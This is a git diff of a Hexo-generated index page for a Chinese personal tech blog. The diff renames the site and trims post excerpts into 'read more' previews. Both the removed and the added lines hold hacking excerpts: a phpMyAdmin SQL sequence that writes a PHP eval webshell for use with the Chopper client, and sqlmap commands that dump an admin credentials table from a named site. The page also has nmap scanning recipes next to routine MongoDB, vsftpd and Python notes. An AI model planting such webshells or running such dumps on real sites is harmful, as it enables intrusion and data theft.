@@ -68,13 +68,13 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="Hello,Blogger">
 
 
 
 
 
-  <link rel="alternate" href="/atom.xml" title="Asan'world" type="application/atom+xml">
+  <link rel="alternate" href="/atom.xml" title="asanzjx'world" type="application/atom+xml">
 
 
 
@@ -86,16 +86,16 @@
 
 
 
-<meta name="description" content="Asanzjx Personal Blog">
+<meta name="description" content="asanzjx Personal Blog">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Asan&#39;world">
+<meta property="og:title" content="asanzjx&#39;world">
 <meta property="og:url" content="https://asanzjx.github.io/page/3/index.html">
-<meta property="og:site_name" content="Asan&#39;world">
-<meta property="og:description" content="Asanzjx Personal Blog">
+<meta property="og:site_name" content="asanzjx&#39;world">
+<meta property="og:description" content="asanzjx Personal Blog">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Asan&#39;world">
-<meta name="twitter:description" content="Asanzjx Personal Blog">
+<meta name="twitter:title" content="asanzjx&#39;world">
+<meta name="twitter:description" content="asanzjx Personal Blog">
 
 
 
@@ -103,7 +103,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     scheme: 'Mist',
-    sidebar: {"position":"left","display":"post"},
+    sidebar: {"position":"left","display":"always"},
     fancybox: true,
     motion: true,
     duoshuo: {
@@ -113,7 +113,7 @@
   };
 </script>
 
-  <title> Asan'world </title>
+  <title> asanzjx'world </title>
 </head>
 
 <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -146,7 +146,7 @@
   <div class="custom-logo-site-title">
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <span class="site-title">Asan'world</span>
+      <span class="site-title">asanzjx'world</span>
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
@@ -326,13 +326,14 @@
       
         
           
-            <h3><span id="进入到phpmyadmin后台本例中以bak配置文件泄露为例">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  create table foo(`cmd` text not <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">  insert into `foo`(`cmd`) values (<span class="string">"&lt;?php @eval($_POST['foo']);?&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  select `cmd`  from `foo` into outfile <span class="string">"./foo.php"</span></span><br></pre></td></tr></table></figure>
-<p>(最好能找到网站路径的的路径，这样写的话在\wamp\bin\mysql\mysql5.6.17\data目录下会生成一个foo.php文件);</p>
-<p>执行完命令后，可以测试是否成功，浏览器直接打开/foo.php，如果出现空白就可以。</p>
-<h3><span id="接下来用chopper">接下来用chopper</span></h3><p>地址为网站foo.php地址，密码为$_POST[]内的内容，配置（可填可不填，如果要管理数据库的话要填），接下来是脚本类型，编码。</p>
-<p>这样就基本可以获得网站的shell，看shell的权限，有的权限很大，有的权限紧紧限于网站根目录的管理。</p>
+          进入到phpmyadmin后台（本例中以bak配置文件泄露为例）12345  create table foo(`cmd` text not null);  insert into `foo`(`cmd`) values ("&lt;?php @eval($_POST['foo']);?&gt;")
+          ...
 
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -450,19 +451,14 @@
       
         
           
-            <h3><span id="1首先新建目录replset用来存数据库文件在replset下新建三个目录dbdb1db2">1.首先新建目录replset用来存数据库文件，在replset下新建三个目录，db,db1,db2.</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  mongod --port 270xx --dbpath=\replset\dbx\ --replSet replset（这里端口测试依次为27018，27019，27020）打开三个数据库服务，</span><br></pre></td></tr></table></figure>
-<p> 登录其中一个mongo shell,输入<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">config = &#123; _id:<span class="string">"replset"</span>, </span><br><span class="line"></span><br><span class="line">  members:[</span><br><span class="line"></span><br><span class="line">      &#123;_id:0,host:<span class="string">"127.0.0.1:27018"</span>&#125;, </span><br><span class="line"></span><br><span class="line">      &#123;_id:1,host:<span class="string">"127.0.0.1:27019"</span>&#125;,</span><br><span class="line"></span><br><span class="line">      &#123;_id:2,host:<span class="string">"127.0.0.1:27020"</span>&#125;</span><br><span class="line"></span><br><span class="line">      ]&#125;</span><br></pre></td></tr></table></figure></p>
-<h3><span id="2接着初始化配置">2.接着初始化配置</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs.initiate(config)</span><br></pre></td></tr></table></figure>
-<p>如果出现错误，code为93</p>
-<p>解决方法：请注意是否_id值是否写错了，应该为 _id:”replset” </p>
-<h3><span id="3-查看副本集的情况">3. 查看副本集的情况</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs.status()</span><br></pre></td></tr></table></figure>
-<p><img src="/images/6630387168002298229.png" alt=""><br><img src="/images/6630387168002298229.png" alt="">  </p>
-<h3><span id="problem">Problem：</span></h3><p>在SECONDARY数据库输入读取命令出错，errmsg:not master，且不能写入数据，查资料可知</p>
-<h3><span id="reason">Reason：</span></h3><p>首先这是正常的，因为SECONDARY是不允许读写的， 在写多读少的应用中，使用Replica Sets来实现读写分离。通过在连接时指定或者在主库指定slaveOk，由Secondary来分担读的压力，Primary只承担写操作。</p>
-<p>对于replica set 中的secondary 节点默认是不可读的</p>
-<h3><span id="try">Try：</span></h3><p>设置db.getMongo().setSlaveOk()即可正常读数据</p>
+          1.首先新建目录replset用来存数据库文件，在replset下新建三个目录，db,db1,db2.1  mongod --port 270xx --dbpath=\replset\dbx\ --replSet replset（这里端口测试依次为27018，27019，27020）打开三个数据库服
+          ...
 
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/07/11/2015-07-11-mongodb replSet 本地测试/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -580,112 +576,31 @@
       
         
           
-            <ul>
-<li>进入vsftpd配置文件</li>
-</ul>
-<p>vim /etc/vsftpd/vsftpd.conf </p>
-<ul>
-<li>禁止匿名用户anonymous登录</li>
-</ul>
-<p>anonymous_enable=NO</p>
-<ul>
-<li>允许本地用户登录</li>
-</ul>
-<p>local_enable=YES</p>
-<ul>
-<li>让登录的用户有写权限(上传，删除)</li>
-</ul>
-<p>write_enable=YES</p>
-<ul>
-<li>默认umask</li>
-</ul>
-<p>local_umask=022</p>
-<ul>
-<li>把传输记录的日志保存到/var/log/vsftpd.log</li>
-</ul>
-<p>xferlog_enable=YES</p>
-<p>xferlog_file=/var/log/vsftpd.log</p>
-<p>xferlog_std_format=NO</p>
-<ul>
-<li>允许ASCII模式上传</li>
-</ul>
-<p>ascii_upload_enable=YES </p>
-<ul>
-<li>允许ASCII模式下载</li>
-</ul>
-<p>ascii_download_enable=YES</p>
-<ul>
-<li>使用20号端口传输数据</li>
-</ul>
-<p>connect_from_port_20=YES</p>
-<ul>
-<li>欢迎标语</li>
-</ul>
-<p>ftpd_banner=Welcome to use my test ftp server.</p>
-<p><strong>接下来的三条配置很重要</strong></p>
-<ul>
-<li><p>chroot_local_user设置了YES，那么所有的用户默认将被chroot，</p>
-</li>
-<li><p>也就用户目录被限制在了自己的home下，无法向上改变目录。</p>
-</li>
-<li><p>chroot_list_enable设置了YES，即让chroot用户列表有效。</p>
-</li>
-<li><p><strong>★超重要：如果chroot_local_user设置了YES，那么chroot_list_file</strong></p>
-</li>
-<li><p>设置的文件里，是不被chroot的用户(可以向上改变目录)</p>
-</li>
-<li><p><strong>★超重要：如果chroot_local_user设置了NO，那么chroot_list_file</strong></p>
-</li>
-<li><p>设置的文件里，是被chroot的用户(无法向上改变目录)</p>
-</li>
-</ul>
-<p>chroot_list_enable=YES</p>
-<ul>
-<li>touch /etc/vsftpd/chroot_list 新建</li>
-</ul>
-<p>chroot_list_file=/etc/vsftpd/chroot_list</p>
-<p>use_localtime=YES</p>
-<ul>
-<li>以standalone模式在ipv4上运行</li>
-</ul>
-<p>listen=YES</p>
-<ul>
-<li><p>PAM认证服务名，这里默认是vsftpd，在安装vsftpd的时候已经创建了这个pam文件，</p>
-</li>
-<li><p>在/etc/pam.d/vsftpd，根据这个pam文件里的设置，/etc/vsftpd/ftpusers</p>
-</li>
-<li><p>文件里的用户将禁止登录ftp服务器，比如root这样敏感的用户，所以你要禁止别的用户</p>
-</li>
-<li><p>登录的时候，也可以把该用户追加到/etc/vsftpd/ftpusers里。</p>
-</li>
-</ul>
-<p>pam_service_name=vsftpd</p>
-<ul>
-<li>重启 vsftpd</li>
-</ul>
-<p>service vsftpd restart</p>
-<ul>
-<li>添加webftp用户组，用来承载我们的ftp授权用户</li>
-</ul>
-<p>groupadd webftp</p>
-<ul>
-<li>创建用户</li>
-</ul>
-<p>useradd -g webftp -M -d /var/www/html/ftp -s /sbin/nologin ftp-zjx</p>
-<ul>
-<li>设置用户到文件夹</li>
-</ul>
-<p>chown -R username /var/www/html/ftp</p>
-<ul>
-<li>设置权限</li>
-</ul>
-<p>chown -R 777  /home/www/html/ftp</p>
-<ul>
-<li>添加密码</li>
-</ul>
-<p>passwd ftp-zjx -&gt; 密码 -&gt; 确认密码</p>
-
           
+进入vsftpd配置文件
+
+vim /etc/vsftpd/vsftpd.conf 
+
+禁止匿名用户anonymous登录
+
+anonymous_enable=NO
+
+允许本地用户登录
+
+local_enable=YES
+
+让登录的用户有写权限(上传，删除)
+
+write_enable=YES
+
+
+          ...
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/06/13/2015-06-13-vsftpd.conf配置/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -803,9 +718,15 @@
       
         
           
-            <p>命运没有既定的轨迹</p>
+          命运没有既定的轨迹
 
           
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/06/10/2015-06-10-/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -923,10 +844,16 @@
       
         
           
-            <p>在查询时，我们也许也会用到or操作。语法格式如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db-&gt;find(<span class="keyword">array</span>(<span class="string">'$or'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">'id'</span> =&gt; <span class="number">1</span>), <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; <span class="string">'java'</span>))));</span><br></pre></td></tr></table></figure></p>
-<p>例如上面的例子，我们查询id是1，或者name是java的数据。</p>
+          在查询时，我们也许也会用到or操作。语法格式如下：1$db-&gt;find(array('$or' =&gt; array(array('id' =&gt; 1), array('name' =&gt; 'java'))));
+例如上面的例子，我们查询id是1，或者name是java的数据。
 
           
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/05/21/2015-05-21-php查询mongodb时的or操作/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1044,12 +971,16 @@
       
         
           
-            <h3><span id="检查注入点">检查注入点</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11</span><br></pre></td></tr></table></figure>
-<h3><span id="列数据库信息">列数据库信息</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs</span><br></pre></td></tr></table></figure>
-<h3><span id="指定库名列出所有表">指定库名列出所有表</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 --tables</span><br></pre></td></tr></table></figure>
-<h2><span id="指定库名表名列出所有字段">指定库名表名列出所有字段</span></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin --columns</span><br></pre></td></tr></table></figure>
-<h3><span id="指定库名表名字段dump出指定字段">指定库名表名字段dump出指定字段</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin -C ac,id,password --dump </span><br><span class="line">--cookie=COOKIE //在需要登录的地方，需要登录后的cookie </span><br><span class="line">--proxy=<span class="string">"http://127.0.0.1:8087"</span> 使用HTTP代理隐藏自己的身份，比如使用goagent等</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY               执行一个sql语句，不一定支持</span><br><span class="line"></span><br><span class="line">.\sqlmapproject-sqlmap-17bfda1</span><br></pre></td></tr></table></figure>
-          
+          检查注入点1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
+列数据库信息1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs
+指定库名列出所有表1sqlmap 
+          ...
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/05/19/2015-05-19-sqlmal-command/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1167,25 +1098,18 @@
       
         
           
-            <h3><span id="获取远程主机的系统类型及开放端口">获取远程主机的系统类型及开放端口</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="_">-s</span>S -P0 <span class="_">-s</span>V -O &lt;target&gt;</span><br></pre></td></tr></table></figure>
-<p>这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</p>
-<p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)</p>
-<p>-P0 允许你关闭 ICMP pings.</p>
-<p>-sV 打开系统版本检测</p>
-<p>-O 尝试识别远程操作系统</p>
-<p>其它选项:</p>
-<p>-A 同时打开操作系统指纹和版本检测</p>
-<p>-v 详细输出扫描情况.</p>
-<p>nmap -sS -P0 -A -v &lt; target &gt;</p>
-<h3><span id="列出开放了指定端口的主机列表">列出开放了指定端口的主机列表</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="_">-s</span>T -p 80 -oG – 192.168.1.* | grep open</span><br></pre></td></tr></table></figure>
-<h3><span id="在网络寻找所有在线主机">在网络寻找所有在线主机</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="_">-s</span>P 192.168.0.*</span><br><span class="line">//或者也可用以下命令指定 subnet:</span><br><span class="line">nmap <span class="_">-s</span>P 192.168.0.0/24</span><br></pre></td></tr></table></figure>
-<h3><span id="ping-指定范围内的-ip-地址">Ping 指定范围内的 IP 地址</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="_">-s</span>P 192.168.1.100-254</span><br></pre></td></tr></table></figure>
-<h3><span id="在某段子网上查找未占用的-ip">在某段子网上查找未占用的 IP</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 <span class="_">-s</span>P 192.168.2.0/24 &amp;&amp; egrep “00:00:00:00:00:00″ /proc/net/arp</span><br></pre></td></tr></table></figure>
-<h3><span id="在局域网上扫找-conficker-蠕虫病毒">在局域网上扫找 Conficker 蠕虫病毒</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args safe=1 192.168.0.1-254</span><br></pre></td></tr></table></figure>
-<h3><span id="扫描网络上的恶意接入点-rogue-aps">扫描网络上的恶意接入点 （rogue APs）.</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1-85,113,443,8080-8100 -T4 –min-hostgroup 50 –max-rtt-timeout 2000 –initial-rtt-timeout 300 –max-retries 3 –host-timeout 20m –max-scan-delay 1000 -oA wapscan 10.0.0.0/8</span><br></pre></td></tr></table></figure>
-<h3><span id="使用诱饵扫描方法来扫描主机端口">使用诱饵扫描方法来扫描主机端口</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap <span class="_">-s</span>S 192.168.0.10 -D 192.168.0.2</span><br><span class="line"></span><br><span class="line">// 为一个子网列出反向 DNS 记录</span><br><span class="line"></span><br><span class="line">nmap -R <span class="_">-s</span>L 209.85.229.99/27 | awk ‘&#123;<span class="keyword">if</span>(<span class="variable">$3</span>==”not”)<span class="built_in">print</span>”(“<span class="variable">$2</span>″) no PTR”;<span class="keyword">else</span> <span class="built_in">print</span><span class="variable">$3</span>″ is “<span class="variable">$2</span>&#125;’ | grep ‘(‘</span><br></pre></td></tr></table></figure>
-<h3><span id="显示网络上共有多少台-linux-及-win-设备">显示网络上共有多少台 Linux 及 Win 设备?</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O 192.168.0.1-255 | grep “Running: ” &gt; /tmp/os; <span class="built_in">echo</span> “$(cat /tmp/os | grep Linux | wc <span class="_">-l</span>) Linux device(s)”; <span class="built_in">echo</span> “$(cat /tmp/os | grep Windows | wc <span class="_">-l</span>) Window(s) device”</span><br></pre></td></tr></table></figure>
-          
+          获取远程主机的系统类型及开放端口1nmap -sS -P0 -sV -O &lt;target&gt;
+这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网
+-sS TCP SYN 扫描 (又称半开放,或隐身扫描)
+-P0 允许你关闭 ICMP pings.
+-sV
+          ...
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/05/19/2015-05-19-nmap/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1303,10 +1227,15 @@
       
         
           
-            <p>使用 python setup.py install 来安装python包，但卸载只能手动删除安装的文件</p>
-<p>可以使用如下命令<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python setup.py install --record files.txt   <span class="comment"># 记录安装后文件的路径  </span></span><br><span class="line"></span><br><span class="line">cat files.txt | xargs rm -rf    <span class="comment"># 删除这些文件</span></span><br></pre></td></tr></table></figure></p>
+          使用 python setup.py install 来安装python包，但卸载只能手动删除安装的文件
+可以使用如下命令123python setup.py install --record files.txt   # 记录安装后文件的路径  cat files.txt | xargs rm -r
+          ...
 
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/04/28/2015-04-28-使用setup.py卸载python包的方法/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1424,16 +1353,17 @@
       
         
           
-            <h3><span id="problem">Problem：</span></h3><p>用vim编辑器时出现提示：</p>
-<p>Taglist: Exuberant ctags (<a href="http://ctags.sf.net" target="_blank" rel="noopener">http://ctags.sf.net</a>) not found in PATH. Plugin is not loaded. </p>
-<h3><span id="reason">Reason：</span></h3><p>taglist plugin不能找到ctags 程序</p>
-<h3><span id="try">Try：</span></h3><p>1.删除.vim文件夹下的相关文件：plugin/taglist.vim和doc/taglist.txt</p>
-<p>2.安装ctags</p>
-<pre><code class="sh">yum install ctags
-</code></pre>
-<p>（推荐使用第二个方法）</p>
+          Problem：用vim编辑器时出现提示：
+Taglist: Exuberant ctags (http://ctags.sf.net) not found in PATH. Plugin is not loaded. 
+Reason：taglist plugin不能找到ctags 程序
+Try：1
+          ...
 
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/04/19/2015-04-19-用vim编辑器时出现提示： Taglist ...not found/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1551,15 +1481,14 @@
       
         
           
-            <h3><span id="具体步骤">具体步骤</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://pypi.python.org/packages/<span class="built_in">source</span>/p/pymongo/pymongo-3.0.tar.gz  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 20150419时官方的版本为3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：wget获取https时要加--no-check-certificate</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line"></span><br><span class="line">tar zvxf  pymongo-3.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> pymongo-3.0</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
-<h3><span id="测试是否成功">测试是否成功</span></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br></pre></td></tr></table></figure>
-<p>如果没有报错就OK啦。</p>
-<h3><span id="problem">Problem：</span></h3><p>可能遇到的问题</p>
-<h4><span id="提示错误找不到pip模块">提示错误找不到pip模块</span></h4><p>下载pip<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate https://github.com/pypa/pip/archive/6.1.1.tar.gz  </span><br><span class="line"></span><br><span class="line"><span class="comment">#2015-04-19 pip官方最新版本为6.1.1</span></span><br><span class="line"></span><br><span class="line">tar zvxf 6.1.1.tar.gz    <span class="comment">#解压文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> pip-6.1.1</span><br><span class="line"></span><br><span class="line">python setup.py build</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></p>
-<h4><span id="提示错误找不到setup模块">提示错误，找不到setup模块</span></h4><p>安装setuptool<br>去官网上下载或者wget,20150419最新的版本为15.1</p>
-<h4><span id="提示错误-runtimeerror-compression-requires-the-missing-zlib-module">提示错误 RuntimeError: Compression requires the (missing) zlib module</span></h4><p>去yum源安装zlib<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装一个依赖包</span></span><br><span class="line"></span><br><span class="line">yum install zlib-devel</span><br><span class="line"><span class="comment">#重新编译Python</span></span><br></pre></td></tr></table></figure></p>
+          具体步骤12345678910111213wget --no-check-certificate https://pypi.python.org/packages/source/p/pymongo/pymongo-3.0.tar.gz  # 20150419时官方的版本为3.0# 注意：wget获取
+          ...
 
-          
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/04/19/2015-04-19-Centos安装pymongo,pip,setuptools相关问题解决步骤/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1622,9 +1551,9 @@
 
       <section class="site-overview sidebar-panel  sidebar-panel-active ">
         <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Asan">
-          <p class="site-author-name" itemprop="name">Asan</p>
-          <p class="site-description motion-element" itemprop="description">Asanzjx Personal Blog</p>
+          <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="asanzjx">
+          <p class="site-author-name" itemprop="name">asanzjx</p>
+          <p class="site-description motion-element" itemprop="description">asanzjx Personal Blog</p>
         </div>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
@@ -1683,6 +1612,20 @@
 
         
         
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://dark-lbp.github.io/" title="小黑猪的技术博客" target="_blank">小黑猪的技术博客</a>
+                </li>
+              
+            </ul>
+          </div>
+        
 
       </section>
 
@@ -1700,12 +1643,12 @@
       <div class="footer-inner">
         <div class="copyright">
   
-  &copy; 
+  &copy;  2015 - 
   <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Asan</span>
+  <span class="author" itemprop="copyrightHolder">asanzjx</span>
 </div>
 
 <div class="powered-by">
